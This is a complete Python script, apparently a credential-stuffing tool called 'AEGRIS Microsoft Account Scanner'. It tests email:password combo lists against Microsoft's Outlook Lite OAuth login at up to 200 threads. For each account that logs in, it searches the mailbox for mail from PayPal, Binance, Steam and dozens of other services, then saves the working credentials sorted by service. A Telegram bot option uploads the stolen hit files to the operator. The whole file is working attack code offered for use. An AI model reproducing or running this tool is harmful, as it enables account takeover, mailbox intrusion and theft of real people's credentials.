import os
import sys
import io
import time
import json
import uuid
import random
import re
import threading
import webbrowser
import concurrent.futures
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any
from threading import Lock, Semaphore

import requests
from colorama import Fore, Style, init

# ======================== SETUP ========================
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
init(autoreset=True)

# ===================== OPEN TELEGRAM CHANNEL =====================
def open_telegram_channel():
    """Opens the Telegram channel URL automatically."""
    try:
        webbrowser.open("")
        time.sleep(0.5)
    except:
        pass

# ===================== CONFIG =====================
@dataclass
class Config:
    max_workers: int = 50
    rate_limit: int = 500
    request_timeout: int = 15
    lock: Lock = field(default_factory=Lock)
    hit: int = 0
    bad: int = 0
    retry: int = 0
    processed: int = 0
    total_combos: int = 0
    service_hits: Dict[str, int] = field(default_factory=dict)
    checked_accounts: set = field(default_factory=set)
    start_time: Optional[float] = None
    semaphore: Semaphore = field(default_factory=lambda: Semaphore(500))
    telegram_bot: Optional['TelegramBot'] = None

# ===================== TELEGRAM =====================
class TelegramBot:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"
    
    def send_message(self, text: str) -> bool:
        try:
            url = f"{self.base_url}/sendMessage"
            payload = {"chat_id": self.chat_id, "text": text, "parse_mode": "HTML"}
            resp = requests.post(url, data=payload, timeout=30)
            return resp.status_code == 200
        except Exception:
            return False
    
    def send_document(self, file_path: str, caption: str = "") -> bool:
        try:
            if not os.path.exists(file_path):
                return False
            url = f"{self.base_url}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': self.chat_id, 'caption': caption}
                resp = requests.post(url, files=files, data=data, timeout=60)
            return resp.status_code == 200
        except Exception:
            return False

# ===================== SERVICES =====================
class ServiceManager:
    SERVICES = {
        "Facebook": {"sender": "security@facebookmail.com", "file": "Hits_Facebook.txt", "cat": "social"},
        "Instagram": {"sender": "security@mail.instagram.com", "file": "Hits_Instagram.txt", "cat": "social"},
        "TikTok": {"sender": "register@account.tiktok.com", "file": "Hits_TikTok.txt", "cat": "social"},
        "Twitter": {"sender": "info@x.com", "file": "Hits_Twitter.txt", "cat": "social"},
        "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "Hits_LinkedIn.txt", "cat": "social"},
        "Pinterest": {"sender": "no-reply@pinterest.com", "file": "Hits_Pinterest.txt", "cat": "social"},
        "Reddit": {"sender": "noreply@reddit.com", "file": "Hits_Reddit.txt", "cat": "social"},
        "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "Hits_Snapchat.txt", "cat": "social"},
        "VK": {"sender": "noreply@vk.com", "file": "Hits_VK.txt", "cat": "social"},
        "WhatsApp": {"sender": "no-reply@whatsapp.com", "file": "Hits_WhatsApp.txt", "cat": "messaging"},
        "Telegram": {"sender": "telegram.org", "file": "Hits_Telegram.txt", "cat": "messaging"},
        "Discord": {"sender": "noreply@discord.com", "file": "Hits_Discord.txt", "cat": "messaging"},
        "Signal": {"sender": "no-reply@signal.org", "file": "Hits_Signal.txt", "cat": "messaging"},
        "Netflix": {"sender": "info@account.netflix.com", "file": "Hits_Netflix.txt", "cat": "streaming"},
        "Spotify": {"sender": "no-reply@spotify.com", "file": "Hits_Spotify.txt", "cat": "streaming"},
        "Twitch": {"sender": "no-reply@twitch.tv", "file": "Hits_Twitch.txt", "cat": "streaming"},
        "YouTube": {"sender": "no-reply@youtube.com", "file": "Hits_YouTube.txt", "cat": "streaming"},
        "Disney+": {"sender": "no-reply@disneyplus.com", "file": "Hits_DisneyPlus.txt", "cat": "streaming"},
        "Hulu": {"sender": "account@hulu.com", "file": "Hits_Hulu.txt", "cat": "streaming"},
        "Amazon Prime": {"sender": "auto-confirm@amazon.com", "file": "Hits_AmazonPrime.txt", "cat": "streaming"},
        "Amazon": {"sender": "auto-confirm@amazon.com", "file": "Hits_Amazon.txt", "cat": "shopping"},
        "eBay": {"sender": "newuser@nuwelcome.ebay.com", "file": "Hits_eBay.txt", "cat": "shopping"},
        "PayPal": {"sender": "service@paypal.com.br", "file": "Hits_PayPal.txt", "cat": "finance"},
        "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "Hits_Binance.txt", "cat": "finance"},
        "Steam": {"sender": "noreply@steampowered.com", "file": "Hits_Steam.txt", "cat": "gaming"},
        "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "Hits_Xbox.txt", "cat": "gaming"},
        "PlayStation": {"sender": "reply@txn-email.playstation.com", "file": "Hits_PlayStation.txt", "cat": "gaming"},
        "Epic Games": {"sender": "help@acct.epicgames.com", "file": "Hits_EpicGames.txt", "cat": "gaming"},
        "Roblox": {"sender": "accounts@roblox.com", "file": "Hits_Roblox.txt", "cat": "gaming"},
        "Google": {"sender": "no-reply@accounts.google.com", "file": "Hits_Google.txt", "cat": "tech"},
        "Microsoft": {"sender": "account-security-noreply@accountprotection.microsoft.com", "file": "Hits_Microsoft.txt", "cat": "tech"},
        "Apple": {"sender": "no-reply@apple.com", "file": "Hits_Apple.txt", "cat": "tech"},
        "GitHub": {"sender": "noreply@github.com", "file": "Hits_GitHub.txt", "cat": "tech"},
        "Dropbox": {"sender": "no-reply@dropbox.com", "file": "Hits_Dropbox.txt", "cat": "tech"},
        "Zoom": {"sender": "no-reply@zoom.us", "file": "Hits_Zoom.txt", "cat": "tech"},
        "NordVPN": {"sender": "no-reply@nordvpn.com", "file": "Hits_NordVPN.txt", "cat": "security"},
        "Airbnb": {"sender": "no-reply@airbnb.com", "file": "Hits_Airbnb.txt", "cat": "travel"},
        "Uber": {"sender": "no-reply@uber.com", "file": "Hits_Uber.txt", "cat": "travel"},
    }
    
    CATEGORY_EMOJI = {
        "social": "📱", "messaging": "💬", "streaming": "📺", "shopping": "🛒",
        "finance": "💰", "gaming": "🎮", "tech": "💻", "security": "🔒",
        "travel": "✈️"
    }
    
    @classmethod
    def select_service_interactive(cls) -> str:
        categorized = {}
        for name, info in cls.SERVICES.items():
            cat = info.get("cat", "other")
            categorized.setdefault(cat, []).append(name)
        
        print(f"\n{Fore.CYAN}▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰")
        print(f"{Fore.MAGENTA}  ⚡ SELECT TARGET SERVICE")
        print(f"{Fore.CYAN}▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n")
        
        counter = 1
        service_map = {}
        for cat_key in ["social", "messaging", "streaming", "shopping", "finance", "gaming", "tech", "security", "travel"]:
            if cat_key in categorized:
                print(f"{Fore.YELLOW}{cls.CATEGORY_EMOJI[cat_key]} {cat_key.upper()}{Style.RESET_ALL}")
                for s in sorted(categorized[cat_key]):
                    service_map[counter] = s
                    print(f"  {Fore.GREEN}{counter:>3}{Fore.WHITE} › {s}")
                    counter += 1
                print()
        
        while True:
            try:
                choice = int(input(f"{Fore.CYAN}└─› Number: {Style.RESET_ALL}"))
                if choice in service_map:
                    return service_map[choice]
                print(f"{Fore.RED}✗ Invalid{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}✗ Enter number{Style.RESET_ALL}")

# ===================== CHECKER =====================
class AccountChecker:
    MICROSOFT_DOMAINS = [
        "hotmail.com", "hotmail.it", "hotmail.de", "hotmail.fr",
        "live.com", "live.it", "live.fr", "live.de",
        "outlook.com", "outlook.sa", "outlook.fr", "outlook.it",
        "outlook.de", "outlook.pt", "outlook.es",
        "msn.com"
    ]
    
    @staticmethod
    def is_microsoft_email(email: str) -> bool:
        email_lower = email.lower()
        for domain in AccountChecker.MICROSOFT_DOMAINS:
            if email_lower.endswith(f"@{domain}"):
                return True
        return False
    
    @staticmethod
    def _create_session() -> requests.Session:
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        return session
    
    @staticmethod
    def check(email: str, password: str, config: Config, selected_service: Optional[str] = None) -> str:
        if not AccountChecker.is_microsoft_email(email):
            return "BAD"
        
        try:
            session = AccountChecker._create_session()
            
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=config.request_timeout)
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                return "BAD"
            
            time.sleep(0.3)
            
            url2 = (
                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
                f"client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code"
                f"&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            )
            r2 = session.get(url2, allow_redirects=True, timeout=config.request_timeout)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return "BAD"
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            login_data = (
                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}"
                f"&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0"
                f"&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
            )
            r3 = session.post(post_url, data=login_data, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }, allow_redirects=False, timeout=config.request_timeout)
            
            if any(x in r3.text for x in ["account or password is incorrect", "Incorrect password", "Invalid credentials"]):
                return "BAD"
            if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
                return "BAD"
            
            location = r3.headers.get("Location", "")
            if not location:
                return "BAD"
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return "BAD"
            
            code = code_match.group(1)
            
            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                              data=token_data, timeout=config.request_timeout)
            if r4.status_code != 200 or "access_token" not in r4.text:
                return "BAD"
            
            access_token = r4.json()["access_token"]
            
            mspcid = None
            for cookie in session.cookies:
                if cookie.name == "MSPCID":
                    mspcid = cookie.value
                    break
            cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
            
            AccountChecker._discover_services(email, password, access_token, cid, config, selected_service)
            return "HIT"
        
        except requests.exceptions.Timeout:
            return "RETRY"
        except Exception:
            return "RETRY"
    
    @staticmethod
    def _discover_services(email: str, password: str, access_token: str, cid: str, config: Config,
                           selected_service: Optional[str] = None) -> None:
        search_url = "https://outlook.live.com/search/api/v2/query"
        services_to_check = {selected_service: ServiceManager.SERVICES[selected_service]} if selected_service else ServiceManager.SERVICES
        
        for service_name, info in services_to_check.items():
            sender = info["sender"]
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": f"from:{sender}"},
                    "Size": 1,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            headers = {
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            try:
                r = requests.post(search_url, json=payload, headers=headers, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if 'EntitySets' in data and len(data['EntitySets']) > 0:
                        entity_set = data['EntitySets'][0]
                        if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                            total = entity_set['ResultSets'][0].get('Total', 0)
                            if total > 0:
                                output_dir = "Accounts"
                                os.makedirs(output_dir, exist_ok=True)
                                file_path = os.path.join(output_dir, info["file"])
                                if not os.path.exists(file_path):
                                    with open(file_path, 'w', encoding='utf-8') as f:
                                        f.write(f"# {service_name}\n\n")
                                with open(file_path, 'a', encoding='utf-8') as f:
                                    f.write(f"{email}:{password}\n")
                                with config.lock:
                                    config.service_hits[service_name] = config.service_hits.get(service_name, 0) + 1
                time.sleep(0.1)
            except:
                continue

# ===================== DASHBOARD =====================
class LiveDashboard:
    
    @staticmethod
    def spinning_animation() -> str:
        frames = ["◢", "◣", "◤", "◥"]
        return frames[int(time.time() * 8) % 4]
    
    @staticmethod
    def progress_bar(percent: float, width: int = 28) -> str:
        filled = int(width * percent / 100)
        colors = [Fore.RED, Fore.YELLOW, Fore.GREEN]
        color = colors[min(int(percent / 40), 2)]
        empty = Fore.LIGHTBLACK_EX
        return f"{color}{'█' * filled}{empty}{'░' * (width - filled)}"
    
    @staticmethod
    def display(config: Config, current_email: str) -> None:
        with config.lock:
            os.system('cls' if os.name == 'nt' else 'clear')
            
            spin = LiveDashboard.spinning_animation()
            progress = min((config.processed / config.total_combos * 100), 100) if config.total_combos > 0 else 0
            bar = LiveDashboard.progress_bar(progress)
            elapsed = time.time() - config.start_time if config.start_time else 0
            elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
            
            # Header
            print(f"\n{Fore.MAGENTA}▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀")
            print(f"{Fore.CYAN}  ⚡ AEGRIS • MICROSOFT SCAN v3.0")
            print(f"{Fore.LIGHTBLACK_EX}  ── @Aegriss")
            print(f"{Fore.LIGHTBLACK_EX}  ── {time.strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"{Fore.MAGENTA}▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n")
            
            # Main stats
            print(f"{Fore.CYAN}  ◈ {Fore.WHITE}HITS   {Fore.GREEN}› {config.hit}")
            print(f"{Fore.CYAN}  ◈ {Fore.WHITE}BAD    {Fore.RED}› {config.bad}")
            print(f"{Fore.CYAN}  ◈ {Fore.WHITE}RETRY  {Fore.YELLOW}› {config.retry}")
            print(f"{Fore.CYAN}  ◈ {Fore.WHITE}PROGRESS  {Fore.CYAN}› {bar} {Fore.WHITE}{progress:.1f}%")
            print(f"{Fore.CYAN}  ◈ {Fore.WHITE}TIME   {Fore.CYAN}› {elapsed_str}")
            print(f"{Fore.CYAN}  ◈ {Fore.WHITE}CHECKED{Fore.CYAN}› {config.processed}/{config.total_combos}\n")
            
            # Services
            if config.service_hits:
                print(f"{Fore.MAGENTA}  ═══ DISCOVERED ═══")
                for sname, cnt in sorted(config.service_hits.items(), key=lambda x: x[1], reverse=True)[:5]:
                    print(f"  {Fore.CYAN}◆ {Fore.WHITE}{sname:<14} {Fore.GREEN}×{cnt}")
            else:
                print(f"  {Fore.LIGHTBLACK_EX}⧗ scanning services...")
            
            # Current email
            print(f"\n{Fore.MAGENTA}  ═══ SCANNING ═══")
            email_disp = current_email[:36] if len(current_email) > 36 else current_email
            print(f"  {Fore.CYAN}{spin} {Fore.WHITE}{email_disp}")
            
            print(f"\n{Fore.MAGENTA}▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀{Style.RESET_ALL}")

# ===================== APP =====================
class Application:
    def __init__(self):
        self.config = Config()
    
    def run(self):
        # Open Telegram channel
        open_telegram_channel()
        
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Splash
        print(f"\n{Fore.MAGENTA}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄")
        print(f"{Fore.CYAN}  █████╗ ███████╗ ██████╗ ██████╗ ██╗███████╗")
        print(f"{Fore.CYAN}  ██╔══██╗██╔════╝██╔════╝ ██╔══██╗██║██╔════╝")
        print(f"{Fore.CYAN}  ███████║█████╗  ██║  ███╗██████╔╝██║███████╗")
        print(f"{Fore.CYAN}  ██╔══██║██╔══╝  ██║   ██║██╔══██╗██║╚════██║")
        print(f"{Fore.CYAN}  ██║  ██║███████╗╚██████╔╝██║  ██║██║███████║")
        print(f"{Fore.CYAN}  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝")
        print(f"{Fore.MAGENTA}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄")
        print(f"{Fore.LIGHTBLACK_EX}  @Aegriss  •  Microsoft Account Scanner  •  100+ Services\n")
        
        # Setup Telegram
        token = input(f"{Fore.CYAN}  ⚡ TG Token (optional): {Style.RESET_ALL}").strip()
        chat_id = input(f"{Fore.CYAN}  ⚡ TG Chat ID: {Style.RESET_ALL}").strip()
        if token and chat_id:
            self.config.telegram_bot = TelegramBot(token, chat_id)
        
        # Mode
        print(f"\n{Fore.MAGENTA}  [1] ALL SERVICES")
        print(f"{Fore.MAGENTA}  [2] SPECIFIC SERVICE")
        mode = input(f"{Fore.CYAN}  ⚡ Mode: {Style.RESET_ALL}").strip()
        selected_service = None
        if mode == "2":
            selected_service = ServiceManager.select_service_interactive()
        
        # Load
        file_path = input(f"{Fore.CYAN}  ⚡ Combo file: {Style.RESET_ALL}").strip()
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if ":" in line]
            combos = [tuple(line.split(":", 1)) for line in lines]
        except FileNotFoundError:
            print(f"{Fore.RED}✗ Not found{Style.RESET_ALL}")
            sys.exit(1)
        
        microsoft_combos = [(e, p) for e, p in combos if AccountChecker.is_microsoft_email(e)]
        if len(microsoft_combos) < len(combos):
            print(f"{Fore.YELLOW}  ⚠ Skipped {len(combos) - len(microsoft_combos)} non-MS emails")
        
        self.config.total_combos = len(microsoft_combos)
        
        try:
            threads = int(input(f"{Fore.CYAN}  ⚡ Threads: {Style.RESET_ALL}"))
            self.config.max_workers = min(max(threads, 1), 200)
        except:
            self.config.max_workers = 50
        
        print(f"\n{Fore.CYAN}  ● {Fore.WHITE}{self.config.total_combos} accounts • {self.config.max_workers} threads")
        time.sleep(1.2)
        
        self.config.start_time = time.time()
        self._start_processing(microsoft_combos, selected_service)
        self._show_final()
    
    def _start_processing(self, combos: List[Tuple[str, str]], selected_service: Optional[str]):
        LiveDashboard.display(self.config, "init")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.max_workers) as executor:
            futures = [executor.submit(self._process, email, password, selected_service) for email, password in combos]
            concurrent.futures.wait(futures)
    
    def _process(self, email: str, password: str, selected_service: Optional[str]):
        account_id = f"{email}:{password}"
        if account_id in self.config.checked_accounts:
            with self.config.lock:
                self.config.processed += 1
            LiveDashboard.display(self.config, email)
            return
        self.config.checked_accounts.add(account_id)
        
        with self.config.semaphore:
            time.sleep(random.uniform(0.01, 0.05))
            status = AccountChecker.check(email, password, self.config, selected_service)
            with self.config.lock:
                if status == "HIT":
                    self.config.hit += 1
                elif status == "BAD":
                    self.config.bad += 1
                elif status == "RETRY":
                    self.config.retry += 1
                else:
                    self.config.bad += 1
                self.config.processed += 1
            LiveDashboard.display(self.config, email)
    
    def _show_final(self):
        elapsed = time.time() - self.config.start_time if self.config.start_time else 0
        elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print(f"\n{Fore.MAGENTA}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄")
        print(f"{Fore.CYAN}  🏁 SCAN COMPLETE")
        print(f"{Fore.MAGENTA}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n")
        print(f"{Fore.CYAN}  TIME    › {elapsed_str}")
        print(f"{Fore.GREEN}  HIT     › {self.config.hit}")
        print(f"{Fore.RED}  BAD     › {self.config.bad}")
        print(f"{Fore.YELLOW}  RETRY   › {self.config.retry}\n")
        
        if self.config.service_hits:
            print(f"{Fore.MAGENTA}  ═══ SERVICES FOUND ═══")
            for sname, cnt in sorted(self.config.service_hits.items(), key=lambda x: x[1], reverse=True)[:10]:
                print(f"  {Fore.CYAN}◆ {Fore.WHITE}{sname:<18} {Fore.GREEN}×{cnt}")
        
        print(f"\n{Fore.MAGENTA}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄")
        print(f"{Fore.LIGHTBLACK_EX}  @Aegriss")
        print(f"{Fore.MAGENTA}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄{Style.RESET_ALL}\n")
        
        if self.config.telegram_bot and self.config.hit > 0:
            print(f"{Fore.CYAN}  📤 Sending to Telegram...")
            summary = f"✅ Scan Done\nTime: {elapsed_str}\nHits: {self.config.hit}\nServices: {len(self.config.service_hits)}"
            self.config.telegram_bot.send_message(summary)
            for sname in self.config.service_hits:
                fp = os.path.join("Accounts", ServiceManager.SERVICES[sname]["file"])
                if os.path.exists(fp):
                    self.config.telegram_bot.send_document(fp)
                    print(f"  ✓ {sname}")
                    time.sleep(0.5)

# ===================== ENTRY =====================
def main():
    try:
        Application().run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠ Interrupted{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}✗ {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()